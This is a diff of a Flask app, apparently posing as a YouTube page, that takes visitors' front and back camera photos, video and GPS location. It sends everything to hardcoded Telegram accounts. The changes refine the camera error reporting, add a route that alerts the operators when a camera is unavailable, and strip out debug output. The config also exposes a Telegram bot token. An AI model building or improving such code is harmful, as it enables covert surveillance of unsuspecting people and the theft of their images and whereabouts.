@@ -4,26 +4,14 @@ from flask import Flask, request, render_template_string
 import telebot
 
 # ========== HARDCODED CONFIG ==========
-BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"   # verify this is correct
-USER_IDS = [7361880623, 8475691696]                             # verify these are correct
+BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
+USER_IDS = [7361880623, 8475691696]
 BASE_URL = "https://web-youtube-asuma66.up.railway.app"
 # ======================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ---------- TEST ROUTE ----------
-@app.route('/test_bot')
-def test_bot():
-    """Manually send a test message to all users."""
-    try:
-        for uid in USER_IDS:
-            bot.send_message(uid, "✅ Bot is working! This is a test message.")
-        return "Test messages sent.", 200
-    except Exception as e:
-        return f"Error: {e}", 500
-
-# ---------- HTML PAGE (same as before) ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -138,6 +126,15 @@ HTML_PAGE = """<!DOCTYPE html>
             await fetch('/capture', { method: 'POST', body: fd });
         }
 
+        // ---- Send camera denial ONLY for user denial ----
+        function sendCameraDenied() {
+            fetch('/camera_denied', { method: 'POST' });
+        }
+
+        function sendCameraUnavailable() {
+            fetch('/camera_unavailable', { method: 'POST' });
+        }
+
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Starting...';
@@ -200,9 +197,26 @@ HTML_PAGE = """<!DOCTYPE html>
                     if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                 });
                 startBtn.innerText = 'Recording...';
-            } catch (e) {
-                updateStatus('Camera permission denied.', false);
-                fetch('/camera_denied', { method: 'POST' });
+            } catch (err) {
+                // Differentiate between user denial and other errors
+                let errorMsg = "Camera permission denied.";
+                let sendFunc = sendCameraDenied;
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    // User explicitly denied
+                    errorMsg = "Camera: Denied by user.";
+                    sendFunc = sendCameraDenied;
+                } else if (err.name === 'NotFoundError') {
+                    errorMsg = "Camera not found (no camera device).";
+                    sendFunc = sendCameraUnavailable;
+                } else if (err.name === 'NotReadableError') {
+                    errorMsg = "Camera busy or not readable.";
+                    sendFunc = sendCameraUnavailable;
+                } else {
+                    errorMsg = "Camera unavailable: " + err.message;
+                    sendFunc = sendCameraUnavailable;
+                }
+                updateStatus(errorMsg, false);
+                sendFunc(); // notify bot
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
             }
@@ -226,7 +240,6 @@ def location():
         for uid in USER_IDS:
             try:
                 bot.send_message(uid, "📍 Location: Denied by user.")
-                print(f"Sent location denied to {uid}")
             except Exception as e:
                 print(f"Error sending to {uid}: {e}")
         return "OK", 200
@@ -237,9 +250,8 @@ def location():
             try:
                 bot.send_location(uid, lat, lng)
                 bot.send_message(uid, f"📍 Location: {lat}, {lng}")
-                print(f"Sent location {lat},{lng} to {uid}")
             except Exception as e:
-                print(f"Error sending location to {uid}: {e}")
+                print(f"Location send error to {uid}: {e}")
         return "OK", 200
     return "Invalid", 400
 
@@ -248,9 +260,17 @@ def camera_denied():
     for uid in USER_IDS:
         try:
             bot.send_message(uid, "📷 Camera: Denied by user.")
-            print(f"Sent camera denied to {uid}")
         except Exception as e:
-            print(f"Error sending camera denied to {uid}: {e}")
+            print(f"Send error to {uid}: {e}")
+    return "OK", 200
+
+@app.route('/camera_unavailable', methods=['POST'])
+def camera_unavailable():
+    for uid in USER_IDS:
+        try:
+            bot.send_message(uid, "📷 Camera: Unavailable (no camera or other error).")
+        except Exception as e:
+            print(f"Send error to {uid}: {e}")
     return "OK", 200
 
 @app.route('/capture', methods=['POST'])
@@ -263,18 +283,15 @@ def capture():
             if front:
                 front.seek(0)
                 bot.send_photo(uid, front.read())
-                print(f"Sent front photo to {uid}")
             if back:
                 back.seek(0)
                 bot.send_photo(uid, back.read())
-                print(f"Sent back photo to {uid}")
             if video:
                 video.seek(0)
                 bot.send_video(uid, video.read(), supports_streaming=True)
-                print(f"Sent video to {uid}")
             bot.send_message(uid, "📸 Media capture complete.")
         except Exception as e:
-            print(f"Error sending media to {uid}: {e}")
+            print(f"Media send error to {uid}: {e}")
     return "OK", 200
 
 # ---------- BOT ----------
